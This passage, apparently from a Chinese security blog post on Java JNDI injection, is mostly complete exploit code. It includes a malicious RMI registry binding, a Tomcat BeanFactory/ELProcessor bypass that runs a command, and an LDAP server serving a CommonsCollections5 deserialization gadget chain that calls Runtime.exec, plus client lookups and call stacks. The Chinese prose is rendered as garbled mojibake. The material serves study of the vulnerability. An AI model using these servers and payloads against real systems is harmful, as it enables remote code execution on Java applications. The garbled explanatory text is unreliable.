class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Test&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Clientå­˜åœ¨Factoryï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Static Code&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non-Arg Constructor&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Constructor Code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;getObjectInstance&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢è¯´åˆ°Clientä¼šå…ˆå°è¯•æœ¬åœ°åŠ è½½ç±»ï¼Œå› æ­¤lookupè¯·æ±‚åï¼ŒåŠ è½½å¹¶å®ä¾‹åŒ–äº†Testç±»ã€‚</p><blockquote><p>Static Code Constructor Code Non-Arg Constructor getObjectInstance</p></blockquote><h3 id="æœ¬åœ°Classåˆ©ç”¨"><a href="#æœ¬åœ°Classåˆ©ç”¨" class="headerlink" title="æœ¬åœ°Classåˆ©ç”¨"></a>æœ¬åœ°Classåˆ©ç”¨</h3><p>ç›®å‰å…¬å¼€å¸¸ç”¨çš„åˆ©ç”¨æ–¹æ³•æ˜¯é€šè¿‡ <strong>Tomcat</strong> çš„ <strong>org.apache.naming.factory.BeanFactory</strong> å·¥å‚ç±»å»è°ƒç”¨ <strong>javax.el.ELProcessor#eval</strong> æ–¹æ³•æˆ– <strong>groovy.lang.GroovyShell#evaluate</strong> æ–¹æ³•</p><blockquote><p><code>org.apache.naming.factory.BeanFactory</code> åœ¨ <code>getObjectInstance()</code> ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–<code>Reference</code>æ‰€æŒ‡å‘çš„<code>Bean Class</code>ï¼Œå¹¶ä¸”èƒ½è°ƒç”¨ä¸€äº›æŒ‡å®šçš„æ–¹æ³•</p></blockquote><p>è¦ä½¿ç”¨ <code>javax.el.ELProcessor</code>ï¼Œéœ€è¦ <code>Tomcat 8+</code>æˆ–<code>SpringBoot 1.2.x+</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">&quot;running&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æç•¥ï¼Œçœ‹åŸæ–‡å»å§ã€‚</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºï¼Œ<code>method.invoke</code>çš„è§¦å‘å¯¹è±¡éœ€æ»¡è¶³ï¼š</p><ul><li>æœ‰æ— å‚æ„é€ å™¨ï¼ˆ<code>beanClass.getConstructor().newInstance()</code>è°ƒç”¨æ— å‚æ„é€ å™¨ï¼‰</li><li>æœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•æ¥æ”¶ä¸”åªæ¥æ”¶ä¸€ä¸ªStringç±»å‹å‚æ•°ï¼ˆvalueArrayæ˜¯Stringç±»å‹çš„æ•°ç»„ï¼Œåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼‰</li></ul><p>æœ¬åœ°åˆ©ç”¨çš„è°ƒç”¨æ ˆï¼š</p><blockquote><p><code>InitialContext#lookup()</code> <code>RegistryContext#lookup()</code> <code>RegistryContext#decodeObject()</code> <code>NamingManager#getObjectInstance()</code> <code>objectfactory = NamingManager#getObjectFactoryFromReference()</code> <code>Class#newInstance()</code> &#x2F;&#x2F;â€“&gt;æ¶æ„ä»£ç è¢«æ‰§è¡Œ </p><p>æˆ–: <code>objectfactory#getObjectInstance()</code> &#x2F;&#x2F;â€“&gt;æ¶æ„ä»£ç è¢«æ‰§è¡Œ</p></blockquote><h3 id="ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡"><a href="#ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡" class="headerlink" title="ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡"></a>ldapè¿”å›åºåˆ—åŒ–å¯¹è±¡</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Serverï¼šç”¨CC5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        String[] args=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://127.0.0.1/#calc&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>        config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(args[ <span class="hljs-number">0</span> ])));<br>        <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>        System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>        ds.startListening();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>,CommonsCollections5());<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] CommonsCollections5() <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map lazyMap=LazyMap.decorate(map,chainedTransformer);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;test&quot;</span>);<br>        BadAttributeValueExpException badAttributeValueExpException=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/calc&quot;</span>;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        initialContext.lookup(url);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212849450.png" alt="image-20240730212849450"></p><p>åŸç†ä¹Ÿå°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">LdapCtx#c_lookup =&gt; <br>decodeObject =&gt; <br>deserializeObject<br></code></pre></td></tr></table></figure><p><img src="/2024/07/30/JNDI/image-20240730212609194.png" alt="image-20240730212609194"></p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/khc-2oyNOA7-MeB0COl31g">JNDIæ³¨å…¥åˆ†æ (qq.com)</a></p><p><a href="https://p4d0rn.gitbook.io/java/prerequisites/rmi-and-jndi/jndi#jndi-ldap">JNDI | Java 